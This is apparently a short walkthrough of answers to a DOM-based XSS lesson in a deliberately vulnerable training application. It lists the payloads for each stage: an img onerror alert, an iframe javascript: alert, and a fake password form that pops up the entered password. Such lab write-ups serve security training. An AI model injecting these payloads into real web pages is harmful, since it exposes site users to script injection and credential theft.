## DOM Based XXS

(stage 1)
Copy the location of the given image `images/logos/owasp.jpg` and enter the following in the input `<img src="images/logos/owasp.jpg"/>`

(stage 2) XSS using img src
`<img src="x" onerror="alert('hello!')"/>`
Note: we are giving the image and invalid source eg. 'x' and using the `onerror` to call an alert if there is an error finding the image.

(stage 3) XSS using iframe
`<iframe src=javascript:alert("hello!")></iframe>`

(stage 4) Fake html form
Add the given code with `<html></html>` tags like below.
```html
<html>Please enter your password:<BR><input type = "password" name="pass"/><button onClick="javascript:alert('I have your password: ' + pass.value);">Submit</button><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR></html>
```

(stage 5) skipped